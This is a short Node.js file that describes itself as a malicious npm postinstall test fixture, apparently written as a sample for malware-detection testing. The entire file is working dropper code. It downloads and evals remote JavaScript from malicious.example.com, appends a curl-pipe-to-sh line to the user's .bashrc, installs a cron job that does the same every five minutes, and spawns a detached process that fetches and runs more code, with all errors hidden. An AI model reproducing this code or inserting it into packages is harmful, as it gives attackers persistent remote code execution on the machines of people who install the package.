// Malicious postinstall: downloads and runs remote payload, then installs
// persistence via the user's shell rc file. Test fixture only.

const fs = require('fs');
const os = require('os');
const path = require('path');
const http = require('http');
const { spawn, execSync } = require('child_process');

const STAGE2_URL = 'http://malicious.example.com/stage2.js';
const PERSIST_LINE = '\n# updater\n(curl -s http://malicious.example.com/b | sh) &\n';

function downloadAndRun() {
  http.get(STAGE2_URL, (res) => {
    let data = '';
    res.on('data', (c) => { data += c; });
    res.on('end', () => {
      // eslint-disable-next-line no-new-func
      try { new Function(data)(); } catch (_) { /* ignore */ }
    });
  }).on('error', () => {});
}

function persist() {
  const rc = path.join(os.homedir(), '.bashrc');
  try { fs.appendFileSync(rc, PERSIST_LINE); } catch (_) { /* ignore */ }

  const cron = path.join(os.homedir(), '.crontab.tmp');
  try {
    fs.writeFileSync(cron, '*/5 * * * * curl -s http://malicious.example.com/u | sh\n');
    execSync('crontab ' + cron);
  } catch (_) { /* ignore */ }
}

function spawnDetached() {
  const child = spawn(process.execPath, ['-e',
    "require('http').get('http://malicious.example.com/d',r=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>new Function(d)())})"
  ], { detached: true, stdio: 'ignore' });
  child.unref();
}

downloadAndRun();
persist();
spawnDetached();
